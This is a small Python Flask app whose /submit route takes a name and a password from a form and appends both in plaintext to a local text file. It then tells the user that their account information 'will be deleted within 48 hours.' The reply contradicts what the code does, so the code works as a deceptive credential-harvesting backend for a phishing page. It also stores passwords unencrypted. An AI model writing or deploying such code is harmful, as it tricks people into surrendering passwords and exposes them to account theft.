from flask import Flask, render_template, request
app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    name = request.form.get('name')
    email = request.form.get('password')

    # Store the form data in a file on disk
    file = open('form_results.txt', 'a')
    file.write(f'Name: {name}, Password: {email}\n')
    file.close()

    return 'If that account exists, any associated information will be deleted within 48 hours.'

if __name__ == '__main__':
    app.run(host='0.0.0.0')
